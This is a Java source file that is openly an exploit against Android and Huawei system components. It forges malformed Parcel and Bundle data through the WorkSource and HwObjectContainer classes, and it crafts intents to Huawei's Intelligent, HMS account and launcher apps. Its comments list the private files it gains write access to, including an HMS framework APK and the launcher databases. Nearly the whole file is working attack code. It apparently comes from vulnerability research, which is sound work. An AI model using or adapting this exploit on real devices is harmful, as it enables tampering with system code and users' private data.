package com.wrlus.htest;

import android.Manifest;
import android.accounts.AccountAuthenticatorResponse;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Parcelable;
import android.os.RemoteException;
import android.util.Log;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Exp {
    private static final String TAG = "HTest.Exp";
    // Keep them in sync with frameworks/native/libs/binder/PersistableBundle.cpp.
    private static final int BUNDLE_MAGIC = 0x4C444E42; // 'B' 'N' 'D' 'L'
    private static final int BUNDLE_MAGIC_NATIVE = 0x4C444E44; // 'B' 'N' 'D' 'N'

    public static Bundle testExpBundle(Intent intent) {
        Bundle bundle = Exp.exploitWorkSource(intent);

        for (String key : bundle.keySet()) {
            Log.w(TAG, "bundle key is " + key);
            if (key == null) {
                continue;
            }
            Log.w(TAG, "bundle key hash code is " + key.hashCode());
            Object value = bundle.get(key);
            if (value instanceof byte[]) {
                Log.w(TAG, "bundle value len is " + ((byte[]) value).length);
            } else if (value instanceof Parcelable) {
                Log.w(TAG, "bundle value is " + value.getClass().getCanonicalName());
            } else {
                Log.w(TAG, "bundle value is " + value);
            }
        }

        Parcel badParcel = Parcel.obtain();
        bundle.writeToParcel(badParcel, 0);
        badParcel.setDataPosition(0);

        Bundle badBundle = new Bundle();
        badBundle.readFromParcel(badParcel);

        for (String key : badBundle.keySet()) {
            Log.w(TAG, "badBundle key is " + key);
            if (key == null) {
                continue;
            }
            Log.w(TAG, "badBundle key hash code is " + key.hashCode());
            Object value = badBundle.get(key);
            if (value instanceof byte[]) {
                Log.w(TAG, "badBundle value len is " + ((byte[]) value).length);
            } else if (value instanceof Parcelable) {
                Log.w(TAG, "badBundle value is " + value.getClass().getCanonicalName());
            } else {
                Log.w(TAG, "badBundle value is " + value);
            }
        }

        badParcel.recycle();

        return bundle;
    }

    public static void exploitHwObjectContainer(Parcel exp, Intent intent) {
        int bundleSizeOffset = exp.dataPosition();
        exp.writeInt(-1); // bundle total size
        exp.writeInt(BUNDLE_MAGIC);
        exp.writeInt(3); // bundle key count

        int bundleStartOffset = exp.dataPosition();

        Log.w(TAG, "key 1 offset = " + exp.dataPosition());
        byte[] key1Name = {0x00};
        exp.writeString(new String(key1Name));
        Log.w(TAG, "key 1 value offset = " + exp.dataPosition());
        exp.writeInt(4); // VAL_PARCELABLE
        exp.writeString("com.huawei.recsys.aidl.HwObjectContainer"); // class name
        exp.writeSerializable(null); // logic from readFromParcel

        Log.w(TAG, "key 2 offset = " + exp.dataPosition());
//        exp.writeList(Collections.emptyList());

        byte[] key2key = {13, 0, 8};
        // len = 3
        exp.writeString(new String(key2key));

        Log.w(TAG, "key 2 type offset = " + exp.dataPosition());
        exp.writeInt(13); // key 2 type before mismatch

        int intentSizeOffset = exp.dataPosition();
        exp.writeInt(-1);

        int intentStartOffset = exp.dataPosition();

        exp.writeString("intent");
        exp.writeInt(4);

        exp.writeParcelable(intent, 0);

        int intentEndOffset = exp.dataPosition();

        Log.w(TAG, "key 3 offset = " + exp.dataPosition());
        exp.writeString("toor");
        exp.writeInt(-1);

        int bundleEndOffset = exp.dataPosition();

        Log.w(TAG, "Jump to bundleSizeOffset = " + bundleSizeOffset +
                ", bundle size = " + (bundleEndOffset - bundleStartOffset));
        exp.setDataPosition(bundleSizeOffset);
        exp.writeInt(bundleEndOffset - bundleStartOffset);

        Log.w(TAG, "Jump to intentSizeOffset = " + intentSizeOffset +
                ", intent size = " + (intentEndOffset - intentStartOffset));
        exp.setDataPosition(intentSizeOffset);
        exp.writeInt(intentEndOffset - intentStartOffset);

        exp.setDataPosition(bundleEndOffset);
    }

    public static Bundle exploitHwObjectContainer2(Intent intent) {
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3);
        obtain2.writeInt(4);
        obtain2.writeInt(13);
        obtain2.writeInt(3);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        obtain2.writeString("com.huawei.recsys.aidl.HwObjectContainer");
        obtain2.writeSerializable(null);
        obtain2.writeInt(4);
        obtain2.writeInt(13);
        obtain2.writeInt(36);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);
        obtain2.writeInt(4);
        obtain2.writeInt(13);
        obtain2.writeInt(66);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        obtain.writeInt(dataSize);
        obtain.writeInt(1279544898);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        return bundle;
    }

    public static Bundle exploitWorkSource(Intent intent) {
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3);
        obtain2.writeInt(13);
        obtain2.writeInt(2);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(6);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        obtain2.writeString("android.os.WorkSource");
        obtain2.writeInt(-1);
        obtain2.writeInt(-1);
        obtain2.writeInt(-1);
        obtain2.writeInt(1);
        obtain2.writeInt(-1);
        obtain2.writeInt(13);
        obtain2.writeInt(13);
        obtain2.writeInt(68);
        obtain2.writeInt(11);
        obtain2.writeInt(0);
        obtain2.writeInt(7);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);
        obtain2.writeInt(13);
        obtain2.writeInt(22);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        obtain.writeInt(dataSize);
        obtain.writeInt(1279544898);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);

        return bundle;
    }

    /**
     * Modify file list:
     *     /data/user/0/com.huawei.intelligent/files/parse/MainUtil_0906094258.jar
     * @return exp intent
     */
    public static Intent getIntelligentExpIntent() {
        Intent secondIntent = new Intent();
        secondIntent.setClassName("com.wrlus.htest", "com.wrlus.htest.intelligent.IntelligentActivity");
        secondIntent.setData(Uri.parse("content://com.huawei.intelligent.fileprovider/files/parse/MainUtil_0906094258.jar"));
        secondIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        secondIntent.addCategory(Intent.CATEGORY_DEFAULT);

        Intent intent = new Intent();
        intent.setClassName("com.huawei.intelligent", "com.huawei.hms.activity.BridgeActivity");
        intent.putExtra("intent.extra.DELEGATE_CLASS_OBJECT", "com.huawei.hms.adapter.ui.BaseResolutionAdapter");
        intent.putExtra("resolution", secondIntent);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TASK);

        return intent;
    }

    /**
     * Modify file list:
     *     /data/user_de/0/com.huawei.hwid/files/framework/earlyinstall/com.huawei.hms.fwkit/60700304/com.huawei.hms.fwkit.apk
     *     /data/user_de/0/com.huawei.hwid/files/kits/com.huawei.hms.fwkit/60700304/com.huawei.hms.fwkit.apk
     *     /data/user_de/0/com.huawei.hwid/files/kits/com.huawei.hms.fwkit/60700304/last_modified
     * @return exp intent
     */
    public static Intent getHwidExpIntent() {
        Intent secondIntent = new Intent();
        secondIntent.setClassName("com.wrlus.htest", "com.wrlus.htest.hwid.HwidActivity");
        secondIntent.setData(Uri.parse("content://com.huawei.hwid.xxx/xxx/data/user_de/0/com.huawei.hwid/files/kits/com.huawei.hms.fwkit/60700304/com.huawei.hms.fwkit.apk"));
        secondIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        secondIntent.addCategory(Intent.CATEGORY_DEFAULT);

        Intent intent = new Intent();
        intent.setClassName("com.huawei.hwid", "");
        intent.putExtra("intent.extra.DELEGATE_CLASS_OBJECT", "com.huawei.hms.adapter.ui.BaseResolutionAdapter");
        intent.putExtra("resolution", secondIntent);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TASK);

        return intent;
    }

    /**
     * Modify file list:
     *     /data/user_de/0/com.huawei.android.launcher/databases/launcher.db
     *     /data/user_de/0/com.huawei.android.launcher/databases/app_icons.db
     * @return exp intent
     */
    public static Intent getLauncherExpIntent() {
        Intent secondIntent = new Intent();
        secondIntent.setClassName("com.wrlus.htest", "com.wrlus.htest.launcher.LauncherActivity");
        secondIntent.setData(Uri.parse("content://com.huawei.internal.app.fileprovider/share/data/user_de/0/com.huawei.android.launcher/databases/launcher.db"));
        secondIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        secondIntent.addCategory(Intent.CATEGORY_DEFAULT);

        Intent intent = new Intent();
        intent.setClassName("com.huawei.android.launcher", "com.huawei.android.launcher.RequestPermissionActivity");
        intent.putExtra("target_intent", secondIntent);
//        Launcher has INTERNET permission by default and it is a normal permission, so will not show permission grant dialog.
        String[] permissions = { Manifest.permission.INTERNET };
        intent.putExtra("request_permission", permissions);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TASK);

        return intent;
    }

    @SuppressLint({"SoonBlockedPrivateApi", "PrivateApi"})
    public static void exploitByReflect(AccountAuthenticatorResponse response) {
        try {
            Field realResponseField = AccountAuthenticatorResponse.class
                    .getDeclaredField("mAccountAuthenticatorResponse");
            realResponseField.setAccessible(true);
            Object realResponse = realResponseField.get(response);
            Method asBinderMethod = Class.forName("android.accounts.IAccountAuthenticatorResponse$Stub$Proxy")
                    .getDeclaredMethod("asBinder");
            IBinder iBinder = (IBinder) asBinderMethod.invoke(realResponse);
            if (iBinder != null) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken("android.accounts.IAccountAuthenticatorResponse");
                data.writeInt(1);

                Exp.exploitHwObjectContainer(data, Exp.getIntelligentExpIntent());

                iBinder.transact(1, data, reply, IBinder.FLAG_ONEWAY);
                reply.readException();
            } else {
                Log.e(TAG, "IAccountAuthenticatorResponse IBinder is null");
            }
        } catch (ReflectiveOperationException | RemoteException e) {
            e.printStackTrace();
        }
    }

    public static Bundle exploit() {
        Intent expIntent = Exp.getLauncherExpIntent();
        return Exp.exploitWorkSource(expIntent);
    }
}
